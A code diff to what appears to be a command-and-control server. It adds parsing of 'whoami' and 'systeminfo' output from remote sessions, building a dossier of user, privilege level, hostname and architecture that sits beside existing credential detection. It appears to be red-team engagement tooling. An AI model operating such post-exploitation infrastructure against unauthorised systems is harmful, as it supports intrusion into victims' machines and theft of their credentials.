@@ -266,6 +266,36 @@ def _c2_store_result(session_id: str, task_id: str, output: str) -> None:
                 del sess["results"][oldest]
 
 
+def _try_update_sysinfo(session_id: str, output: str) -> None:
+    """Parse whoami /all and systeminfo output to populate session dossier."""
+    import re as _re
+    data = {}
+    # whoami /all — extract username and integrity
+    m = _re.search(r"={2,}[= \t]*[\r\n]+([\w\\][\w\\ ]*?)\s+S-1-\d", output, _re.IGNORECASE)
+    if m:
+        data["username"] = m.group(1)
+    m = _re.search(r"Mandatory Label\\(\w+) Mandatory Level", output, _re.IGNORECASE)
+    if m:
+        data["integrity"] = m.group(1)
+    # systeminfo — extract hostname and arch
+    m = _re.search(r"Host Name:\s+(\S+)", output, _re.IGNORECASE)
+    if m:
+        data["hostname"] = m.group(1)
+    m = _re.search(r"System Type:\s+(\S+)-based", output, _re.IGNORECASE)
+    if m:
+        data["arch"] = m.group(1)
+    # whoami simple
+    if not data.get("username"):
+        m = _re.search(r"^([a-z0-9_\-]+\\[a-z0-9_\- ]+)\s*$", output, _re.IGNORECASE | _re.MULTILINE)
+        if m:
+            data["username"] = m.group(1).strip()
+    if data and _ENGAGE_DB:
+        try:
+            _ENGAGE_DB.update_sysinfo(session_id, data)
+        except Exception:
+            pass
+
+
 def _auto_analyze_result(session_id: str, task_id: str, output: str, has_creds: bool) -> None:
     """Disabled — Astaroth is manual-only. History is absorbed when operator consults."""
     return
@@ -729,6 +759,7 @@ class _Handler(http.server.BaseHTTPRequestHandler):
             _ENGAGE_DB.touch_session(session_id)
             from core.engage import detect_creds
             has_creds, _ = detect_creds(output)
+            _try_update_sysinfo(session_id, output)
         _sse_publish({"type": "task_result", "task_id": task_id, "session_id": session_id,
                       "has_creds": has_creds, "ts": datetime.now().strftime("%H:%M:%S")})
         _auto_analyze_result(session_id, task_id, output, has_creds)
